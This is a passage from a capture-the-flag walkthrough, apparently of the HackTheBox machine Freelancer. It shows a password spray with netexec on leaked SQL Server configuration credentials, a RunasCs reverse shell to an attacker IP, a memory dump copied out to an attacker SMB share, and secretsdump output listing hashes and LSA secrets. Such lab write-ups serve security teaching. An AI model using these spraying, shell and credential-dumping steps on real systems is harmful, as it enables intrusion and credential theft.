+              MICROSOFT.SQLSERVER.DISCOVERY.XMLSERIALIZERS.DLL
+              MICROSOFT.SQLSERVER.DMF.COMMON.DLL
+              MICROSOFT.SQLSERVER.DMF.DLL
+              MICROSOFT.SQLSERVER.INSTAPI.DLL
+              MICROSOFT.SQLSERVER.INTEROP.FIREWALLAPI.DLL
+              MICROSOFT.SQLSERVER.INTEROP.TASKSCHD.DLL
+              MICROSOFT.SQLSERVER.INTEROP.WUAPILIB.DLL
+              MICROSOFT.SQLSERVER.MANAGEMENT.CONTROLS.DLL
+              MICROSOFT.SQLSERVER.MANAGEMENT.SDK.SFC.DLL
+              MICROSOFT.SQLSERVER.SETUP.CHAINER.WORKFLOW.DLL
+              MICROSOFT.SQLSERVER.SETUP.CHAINER.WORKFLOW.XMLSERIALIZERS.DLL
+              MICROSOFT.SQLSERVER.SMO.DLL
+              MICROSOFT.SQLSERVER.SQLCLRPROVIDER.DLL
+              MICROSOFT.SQLSERVER.SQLENUM.DLL
+              MICROSOFT.SQLSERVER.SSTRING.DLL
+              MICROSOFT.SQLSERVER.USAGETRACKING.DLL
+              MSVCP140.DLL
+              MSVCP140_1.DLL
+              NEWTONSOFT.JSON.DLL
+              PACKAGE.XSD
+              PIDGENX.DLL
+              PIDPRIVATECONFIGOBJECTMAPS.XML
+              PREPARECLUSTERWIZARD.XML
+              PREPAREIMAGEWIZARD.XML
+              REMOVENODE.XML
+              REPAIRWIZARD.XML
+              RSETUP.EXE
+              RUNRULESUI.XML
+              SCENARIOENGINE.EXE
+              SCENARIOENGINE.EXE.CONFIG
+              SHELLOBJECTS.DLL
+              SQLBOOT.DLL
+              SQLCAB.DLL
+              SQLCONF.DLL
+              SQLMU.DLL
+              SQLPROCESSSUB.DLL
+              SQLSCCN.DLL
+              UNINSTALLWIZARD.XML
+              UPGRADEWIZARD.XML
+              VCCORLIB140.DLL
+              VCRUNTIME140.DLL
+
+           Setup
+                   CONN_INFO.MSI
+                   RSFX.MSI
+                   SMO.MSI
+                   SMO_EXTENSIONS.MSI
+                   SQL_BATCHPARSER.MSI
+                   SQL_COMMON_CORE.MSI
+                   SQL_DIAG.MSI
+                   SQL_DMF.MSI
+                   SQL_ENGINE_CORE_INST.MSI
+                   SQL_ENGINE_CORE_SHARED.MSI
+                   SQL_XEVENT.MSI
+
+Favorites
+Links
+Music
+Pictures
+Saved Games
+Searches
+Videos
+</span></code></pre></div></div>
+<p>The top level directory contains installers, as well as a configuration file:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\users\sql_svc\downloads\SQLEXPR-2019_x64_ENU&gt;</span><span class="w"> </span><span class="n">ls</span><span class="w">
+</span><span class="go">
+    Directory: C:\users\sql_svc\downloads\SQLEXPR-2019_x64_ENU
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        5/27/2024   1:52 PM                1033_ENU_LP
+d-----        5/27/2024   1:52 PM                redist
+d-----        5/27/2024   1:52 PM                resources
+d-----        5/27/2024   1:52 PM                x64
+-a----        9/24/2019   9:00 PM             45 AUTORUN.INF
+-a----        9/24/2019   9:00 PM            784 MEDIAINFO.XML
+-a----        9/29/2023   4:49 AM             16 PackageId.dat
+-a----        9/24/2019   9:00 PM         142944 SETUP.EXE
+-a----        9/24/2019   9:00 PM            486 SETUP.EXE.CONFIG
+-a----        5/27/2024   4:58 PM            724 sql-Configuration.INI
+-a----        9/24/2019   9:00 PM         249448 SQLSETUPBOOTSTRAPPER.DLL
+</span></code></pre></div></div>
+<p>The configuration file defines how the MSSQL instance runs:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\users\sql_svc\downloads\SQLEXPR-2019_x64_ENU&gt;</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="nx">sql-Configuration.INI</span><span class="w">
+</span><span class="go">[OPTIONS]
+ACTION="Install"
+QUIET="True"
+FEATURES=SQL
+INSTANCENAME="SQLEXPRESS"
+INSTANCEID="SQLEXPRESS"
+RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS"
+AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE"
+AGTSVCSTARTUPTYPE="Manual"
+COMMFABRICPORT="0"
+COMMFABRICNETWORKLEVEL=""0"
+COMMFABRICENCRYPTION="0"
+MATRIXCMBRICKCOMMPORT="0"
+SQLSVCSTARTUPTYPE="Automatic"
+FILESTREAMLEVEL="0"
+ENABLERANU="False" 
+SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"
+SQLSVCACCOUNT="FREELANCER\sql_svc"
+SQLSVCPASSWORD="IL0v3ErenY3ager"
+SQLSYSADMINACCOUNTS="FREELANCER\Administrator"
+SECURITYMODE="SQL"
+SAPWD="t3mp0r@ryS@PWD"
+ADDCURRENTUSERASSQLADMIN="False"
+TCPENABLED="1"
+NPENABLED="1"
+BROWSERSVCSTARTUPTYPE="Automatic"
+IAcceptSQLServerLicenseTerms=True
+</span></code></pre></div></div>
+<p>“IL0v3ErenY3ager” and “t3mp0r@ryS@PWD” are two passwords leaked.</p>
+<h3 id="password-spray">Password Spray</h3>
+<p>I’ll create a file with all the users on the box, and another with these two passwords, and use <code class="language-plaintext highlighter-rouge">netexec</code> to check each of them over SMB:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb freelancer.htb <span class="nt">-u</span> <span class="nb">users</span> <span class="nt">-p</span> passwords <span class="nt">--continue-on-success</span>
+<span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:freelancer.htb) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">)
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\administrator:IL0v3ErenY3ager STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\lkazanof:IL0v3ErenY3ager STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\lorra199:IL0v3ErenY3ager STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logsuccess">[+]</span><span class="go"> freelancer.htb\mikasaAckerman:IL0v3ErenY3ager 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\MSSQLSERVER:IL0v3ErenY3ager STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\sqlbackupoperator:IL0v3ErenY3ager STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\sql_svc:IL0v3ErenY3ager STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\administrator:t3mp0r@ryS@PWD STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\lkazanof:t3mp0r@ryS@PWD STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\lorra199:t3mp0r@ryS@PWD STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\MSSQLSERVER:t3mp0r@ryS@PWD STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\sqlbackupoperator:t3mp0r@ryS@PWD STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\sql_svc:t3mp0r@ryS@PWD STATUS_LOGON_FAILURE
+</span></code></pre></div></div>
+<p>There’s a match on mikasaAckerman!</p>
+<p>Unfortunately, no hits on WinRM:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec winrm freelancer.htb <span class="nt">-u</span> <span class="nb">users</span> <span class="nt">-p</span> passwords <span class="nt">--continue-on-success</span>
+<span class="netexec-protocol">WINRM </span><span class="go">      10.10.11.5      5985   DC               </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows 10 / Server 2019 Build 17763 (name:DC) (domain:freelancer.htb)
+</span><span class="netexec-protocol">WINRM </span><span class="go">      10.10.11.5      5985   DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\administrator:IL0v3ErenY3ager
+</span><span class="netexec-protocol">WINRM </span><span class="go">      10.10.11.5      5985   DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\lkazanof:IL0v3ErenY3ager
+</span><span class="netexec-protocol">WINRM </span><span class="go">      10.10.11.5      5985   DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\lorra199:IL0v3ErenY3ager
+</span><span class="netexec-protocol">WINRM </span><span class="go">      10.10.11.5      5985   DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\mikasaAckerman:IL0v3ErenY3ager
+</span><span class="netexec-protocol">WINRM </span><span class="go">      10.10.11.5      5985   DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\MSSQLSERVER:IL0v3ErenY3ager
+</span><span class="netexec-protocol">WINRM </span><span class="go">      10.10.11.5      5985   DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\sqlbackupoperator:IL0v3ErenY3ager
+</span><span class="netexec-protocol">WINRM </span><span class="go">      10.10.11.5      5985   DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\sql_svc:IL0v3ErenY3ager
+</span><span class="netexec-protocol">WINRM </span><span class="go">      10.10.11.5      5985   DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\administrator:t3mp0r@ryS@PWD
+</span><span class="netexec-protocol">WINRM </span><span class="go">      10.10.11.5      5985   DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\lkazanof:t3mp0r@ryS@PWD
+</span><span class="netexec-protocol">WINRM </span><span class="go">      10.10.11.5      5985   DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\lorra199:t3mp0r@ryS@PWD
+</span><span class="netexec-protocol">WINRM </span><span class="go">      10.10.11.5      5985   DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\mikasaAckerman:t3mp0r@ryS@PWD
+</span><span class="netexec-protocol">WINRM </span><span class="go">      10.10.11.5      5985   DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\MSSQLSERVER:t3mp0r@ryS@PWD
+</span><span class="netexec-protocol">WINRM </span><span class="go">      10.10.11.5      5985   DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\sqlbackupoperator:t3mp0r@ryS@PWD
+</span><span class="netexec-protocol">WINRM </span><span class="go">      10.10.11.5      5985   DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\sql_svc:t3mp0r@ryS@PWD
+</span></code></pre></div></div>
+<h3 id="runascs">RunasCs</h3>
+<p>I’ll grab a copy of <a href="https://github.com/antonioCoco/RunasCs">RunasCs</a> from GitHub and host it on a Python webserver. I’ll fetch it with PowerShell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\programdata&gt;</span><span class="w"> </span><span class="n">curl</span><span class="w"> </span><span class="nx">10.10.14.6/RunasCs.exe</span><span class="w"> </span><span class="nt">-outfile</span><span class="w"> </span><span class="nx">RunasCs.exe</span><span class="w">
+</span></code></pre></div></div>
+<p>Now I’ll run it to get a reverse shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\programdata&gt;</span><span class="w"> </span><span class="o">.</span><span class="n">\RunasCs.exe</span><span class="w"> </span><span class="nx">mikasaAckerman</span><span class="w"> </span><span class="s2">"IL0v3ErenY3ager"</span><span class="w"> </span><span class="nt">-d</span><span class="w"> </span><span class="nx">freelancer.htb</span><span class="w"> </span><span class="nx">cmd</span><span class="w"> </span><span class="nt">-r</span><span class="w"> </span><span class="nx">10.10.14.6:444</span><span class="w">
+</span><span class="go">
+[+] Running in session 0 with process function CreateProcessWithLogonW()
+[+] Using Station\Desktop: Service-0x0-43538$\Default
+[+] Async process 'C:\WINDOWS\system32\cmd.exe' with pid 524 created in background.
+</span></code></pre></div></div>
+<p>At <code class="language-plaintext highlighter-rouge">nc</code>:</p>
+<div class="language-console rlwrap-disclaimer highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>rlwrap <span class="nt">-cAr</span> nc <span class="nt">-lnvp</span> 444
+<span class="go">Listening on 0.0.0.0 444
+Connection received on 10.10.11.5 61910
+Microsoft Windows [Version 10.0.17763.5830]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+</span><span class="gp">C:\WINDOWS\system32&gt;</span><span class="w">
+</span></code></pre></div></div>
+<p>I’ll upgrade to PowerShell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">C:\WINDOWS\system32&gt;</span><span class="w"> </span>powershell
+<span class="go">Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.
+</span><span class="gp">PS C:\WINDOWS\system32&gt;</span><span class="w">
+</span></code></pre></div></div>
+<p>And grab the flag:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\Users\mikasaAckerman\desktop&gt;</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="nx">user.txt</span><span class="w">
+</span><span class="go">4b621f61************************
+</span></code></pre></div></div>
+<h2 id="shell-as-lorra199">Shell as lorra199</h2>
+<h3 id="enumeration-1">Enumeration</h3>
+<p>On mikasaAckerman’s desktop there’s two additional files beyond the flag:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\Users\mikasaAckerman\desktop&gt;</span><span class="w"> </span><span class="n">ls</span><span class="w">
+</span><span class="go">
+    Directory: C:\Users\mikasaAckerman\desktop
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----       10/28/2023   6:23 PM           1468 mail.txt
+-a----        10/4/2023   1:47 PM      292692678 MEMORY.7z
+-a----       10/19/2023   7:43 PM             66 user.txt
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">mail.txt</code> has a note:</p>
+<blockquote>
+<p>Hello Mikasa,
+I tried once again to work with Liza Kazanoff after seeking her help to troubleshoot the BSOD issue on the “DATACENTER-2019” computer. As you know, the problem started occurring after we installed the new update of SQL Server 2019.
+I attempted the solutions you provided in your last email, but unfortunately, there was no improvement. Whenever we try to establish a remote SQL connection to the installed instance, the server’s CPU starts overheating, and the RAM usage keeps increasing until the BSOD appears, forcing the server to restart.
+Nevertheless, Liza has requested me to generate a full memory dump on the Datacenter and send it to you for further assistance in troubleshooting the issue.
+Best regards,</p>
+</blockquote>
+<p>There’s a full memory dump of the system!</p>
+<p>I’ll exfil it by first creating an SMB share on my host:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>smbserver.py share <span class="nb">.</span> <span class="nt">-username</span> oxdf <span class="nt">-password</span> oxdf <span class="nt">-smb2support</span>
+<span class="go">Impacket v0.12.0.dev1+20240308.164415.4a62f39 - Copyright 2023 Fortra
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+</span></code></pre></div></div>
+<p>On Freelancer, I’ll mount the share:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\Users\mikasaAckerman\desktop&gt;</span><span class="w"> </span><span class="n">net</span><span class="w"> </span><span class="nx">use</span><span class="w"> </span><span class="nx">\\10.10.14.6\share</span><span class="w"> </span><span class="nx">/u:oxdf</span><span class="w"> </span><span class="nx">oxdf</span><span class="w">
+</span><span class="go">The command completed successfully.
+</span></code></pre></div></div>
+<p>Now I’ll copy the dump onto it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\Users\mikasaAckerman\desktop&gt;</span><span class="w"> </span><span class="n">copy</span><span class="w"> </span><span class="nx">MEMORY.7z</span><span class="w"> </span><span class="nx">\\10.10.14.6\share\</span><span class="w">
+</span></code></pre></div></div>
+<p>And make sure the hashes match:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\Users\mikasaAckerman\desktop&gt;</span><span class="w"> </span><span class="n">get-filehash</span><span class="w"> </span><span class="nt">-algorithm</span><span class="w"> </span><span class="nx">md5</span><span class="w"> </span><span class="nx">MEMORY.7z</span><span class="w">
+</span><span class="go">
+Algorithm       Hash                                                                   Path                            
+---------       ----                                                                   ----                            
+MD5             931386993AB32B37692FDE69E8FF389F       C:\Users\mikasaAckerman\deskt...
+</span></code></pre></div></div>
+<p>They do:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">md5sum </span>MEMORY.7z 
+<span class="go">931386993ab32b37692fde69e8ff389f  MEMORY.7z
+</span></code></pre></div></div>
+<h3 id="dump-analysis">Dump Analysis</h3>
+<p>I fought a vigorous and brave fight with Volatility, and lost on this one. I also learned a good deal about evaluating crash dumps with WinDbg from <a href="https://x.com/DebugPrivilege">DebugPrivilege</a> (there’s even a Mimikatz plugin that will dump creds that leads to an unintended solution I’ll show in <a href="#alternative-paths-to-administrator">Beyond Root</a>).</p>
+<p>But what ended up getting me down the intended path is <a href="https://github.com/ufrisk/MemProcFS">MemProcFS</a>. I’ll download the latest release, and use it to mount the memory as a directory:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">sudo</span> /opt/MemProcFS/memprocfs <span class="nt">-device</span> MEMORY.DMP <span class="nt">-mount</span> /mnt
+<span class="go">Initialized 64-bit Windows 10.0.17763
+
+==============================  MemProcFS  ==============================
+ - Author:           Ulf Frisk - pcileech@frizk.net                      
+ - Info:             https://github.com/ufrisk/MemProcFS                 
+ - Discord:          https://discord.gg/pcileech                         
+ - License:          GNU Affero General Public License v3.0              
+   --------------------------------------------------------------------- 
+   MemProcFS is free open source software. If you find it useful please  
+   become a sponsor at: https://github.com/sponsors/ufrisk Thank You :)  
+   --------------------------------------------------------------------- 
+ - Version:          5.9.17 (Linux)
+ - Mount Point:      /mnt           
+ - Tag:              17763_a3431de6        
+ - Operating System: Windows 10.0.17763 (X64)
+==========================================================================
+</span></code></pre></div></div>
+<p>This just hangs, but in another terminal:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@hacky[/mnt]#</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">conf  forensic  memory.dmp  memory.pmem  misc  name  pid  py  registry  sys
+</span></code></pre></div></div>
+<p>In the <code class="language-plaintext highlighter-rouge">registry</code> directory are directories and files  representing the parts of registry hives that it’s able to pull out:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@hacky[/mnt/registry]#</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">by-hive  hive_files  hive_memory  HKLM  HKU
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">HKLM</code> and <code class="language-plaintext highlighter-rouge">HKU</code> are filesystem representations of the keys. For example, to see where <a href="https://attack.mitre.org/techniques/T1003/004/">LSA Secrets</a> are stored:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@hacky[/mnt/registry]#</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="nx">HKLM/SECURITY/Policy/Secrets/</span><span class="w">
+</span><span class="go">'$MACHINE.ACC'  '(Default)'   DefaultPassword  '(Default).txt'   DPAPI_SYSTEM  '(_Key_)'  '(_Key_).txt'  'NL$KM'  '_SC_MSSQL$DATA'  '_SC_SQLTELEMETRY$DATA'
+</span><span class="gp">root@hacky[/mnt/registry]#</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="nx">HKLM/SECURITY/Policy/Secrets/_SC_MSSQL\</span><span class="nv">$DATA</span><span class="nx">/CurrVal/\</span><span class="p">(</span><span class="err">_</span><span class="n">Key_\</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">xxd</span><span class="w">
+</span><span class="go">00000000: a8ff ffff 6e6b 2000 ffb7 dd9c bdf6 d901  ....nk .........
+00000010: 0100 0000 984f 0000 0000 0000 0000 0000  .....O..........
+00000020: ffff ffff ffff ffff 0100 0000 f84f 0000  .............O..
+00000030: 6801 0000 ffff ffff 0000 0000 0000 0000  h...............
+00000040: 0000 0000 7c00 0000 0000 0000 0700 0000  ....|...........
+00000050: 4375 7272 5661 6c00                      CurrVal.
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">hive_files</code> has files that represent what can be recovered from of the hive files:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@hacky[/mnt/registry]#</span><span class="w"> </span><span class="nb">ls </span>hive_files/
+<span class="go">0xffffd30679c0e000-unknown-unknown.reghive                                              0xffffd3067db43000-BBI-A_{ae450ff4-3002-4d4d-921c-fd354d63ec8b}.reghive
+0xffffd30679c46000-SYSTEM-MACHINE_SYSTEM.reghive                                        0xffffd3067db53000-NTUSERDAT-USER_S-1-5-19.reghive
+0xffffd30679cdc000-unknown-MACHINE_HARDWARE.reghive                                     0xffffd3067dd5e000-ActivationStoredat-A_{D65833F6-A688-4A68-A28F-F59183BDFADA}.reghive
+0xffffd3067b257000-settingsdat-A_{c94cb844-4804-8507-e708-439a8873b610}.reghive         0xffffd3067e30e000-UsrClassdat-USER_S-1-5-21-3542429192-2036945976-3483670807-1121_Classes.reghive
+0xffffd3067b261000-ActivationStoredat-A_{23F7AFEB-1A41-4BD7-9168-EA663F1D9A7D}.reghive  0xffffd3067ec26000-Amcachehve-A_{da3518a3-bbc6-1dba-206b-2755382f1364}.reghive
+0xffffd3067b514000-BCD-MACHINE_BCD00000000.reghive                                      0xffffd3067ec39000-ntuserdat-USER_S-1-5-21-3542429192-2036945976-3483670807-1121.reghive
+0xffffd3067b516000-SOFTWARE-MACHINE_SOFTWARE.reghive                                    0xffffd3067ec58000-settingsdat-A_{8a28242f-95cc-f96a-239c-d8a872afe4cc}.reghive
+0xffffd3067d7e9000-DEFAULT-USER_.DEFAULT.reghive                                        0xffffd3067f097000-DRIVERS-MACHINE_DRIVERS.reghive
+0xffffd3067d7f0000-SECURITY-MACHINE_SECURITY.reghive                                    0xffffd3067f91b000-UsrClassdat-USER_S-1-5-21-3542429192-2036945976-3483670807-500_Classes.reghive
+0xffffd3067d935000-SAM-MACHINE_SAM.reghive                                              0xffffd3067f9e7000-ntuserdat-USER_S-1-5-21-3542429192-2036945976-3483670807-500.reghive
+0xffffd3067d9c4000-NTUSERDAT-USER_S-1-5-20.reghive
+</span></code></pre></div></div>
+<p>This is enough to <code class="language-plaintext highlighter-rouge">secretsdump.py</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@hacky[/mnt/registry/hive_files]# </span>secretsdump.py <span class="nt">-sam</span> 0xffffd3067d935000-SAM-MACHINE_SAM.reghive <span class="nt">-security</span> 0xffffd3067d7f0000-SECURITY-MACHINE_SECURITY.reghive <span class="nt">-system</span> 0xffffd30679c46000-SYSTEM-MACHINE_SYSTEM.reghive <span class="nb">local</span>
+<span class="go">Impacket v0.10.1.dev1+20230216.13520.d4c06e7f - Copyright 2022 Fortra
+
+[*] Target system bootKey: 0xaeb5f8f068bbe8789b87bf985e129382
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:725180474a181356e53f4fe3dffac527:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:04fc56dd3ee3165e966ed04ea791d7a7:::
+[*] Dumping cached domain logon information (domain/username:hash)
+FREELANCER.HTB/Administrator:$DCC2$10240#Administrator#67a0c0f193abd932b55fb8916692c361
+FREELANCER.HTB/lorra199:$DCC2$10240#lorra199#7ce808b78e75a5747135cf53dc6ac3b1
+FREELANCER.HTB/liza.kazanof:$DCC2$10240#liza.kazanof#ecd6e532224ccad2abcf2369ccb8b679
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC 
+$MACHINE.ACC:plain_password_hex:a680a4af30e045066419c6f52c073d738241fa9d1cff591b951535cff5320b109e65220c1c9e4fa891c9d1ee22e990c4766b3eb63fb3e2da67ebd19830d45c0ba4e6e6df93180c0a7449750655edd78eb848f757689a6889f3f8f7f6cf53e1196a528a7cd105a2eccefb2a17ae5aebf84902e3266bbc5db6e371627bb0828c2a364cb01119cf3d2c70d920328c814cad07f2b516143d86d0e88ef1504067815ed70e9ccb861f57394d94ba9f77198e9d76ecadf8cdb1afda48b81f81d84ac62530389cb64d412b784f0f733551a62ec0862ac2fb261b43d79990d4e2bfbf4d7d4eeb90ccd7dc9b482028c2143c5a6010
+$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:1003ddfa0a470017188b719e1eaae709
+[*] DPAPI_SYSTEM 
+dpapi_machinekey:0xcf1bc407d272ade7e781f17f6f3a3fc2b82d16bc
+dpapi_userkey:0x6d210ab98889fac8829a1526a5d6a2f76f8f9d53
+[*] NL$KM 
+ 0000   63 4D 9D 4C 85 EF 33 FF  A5 E1 4D E2 DC A1 20 75   cM.L..3...M... u
+ 0010   D2 20 EA A9 BC E0 DB 7D  BE 77 E9 BE 6E AD 47 EC   . .....}.w..n.G.
+ 0020   26 02 E1 F6 BF F5 C5 CC  F9 D6 7A 16 49 1C 43 C5   &amp;.........z.I.C.
+ 0030   77 6D E0 A8 C6 24 15 36  BF 27 49 96 19 B9 63 20   wm...$.6.'I...c 
+NL$KM:634d9d4c85ef33ffa5e14de2dca12075d220eaa9bce0db7dbe77e9be6ead47ec2602e1f6bff5c5ccf9d67a16491c43c5776de0a8c6241536bf27499619b96320
+[*] _SC_MSSQL$DATA 
+(Unknown User):PWN3D#l0rr@Armessa199
+[*] Cleaning up...
+</span></code></pre></div></div>
+<p>The administrator hash doesn’t work on Freelancer. But there is a plaintext password for the MSSQL service account, “PWN3D#l0rr@Armessa199”. There’s also a hash in here that will come into play when I show the <a href="#intended-path">intended path</a> in Beyond Root.</p>
+<h3 id="password-spray-1">Password Spray</h3>
+<p>The “PWN3D#l0rr@Amressa199” password works for lorra199 for both SMB and WinrM:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb freelancer.htb <span class="nt">-u</span> <span class="nb">users</span> <span class="nt">-p</span> passwords2 <span class="nt">--continue-on-success</span>
+<span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:freelancer.htb) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">)
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\administrator:PWN3D#l0rr@Armessa199 STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\lkazanof:PWN3D#l0rr@Armessa199 STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logsuccess">[+]</span><span class="go"> freelancer.htb\lorra199:PWN3D#l0rr@Armessa199 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\mikasaAckerman:PWN3D#l0rr@Armessa199 STATUS_LOGON_FAILURE 
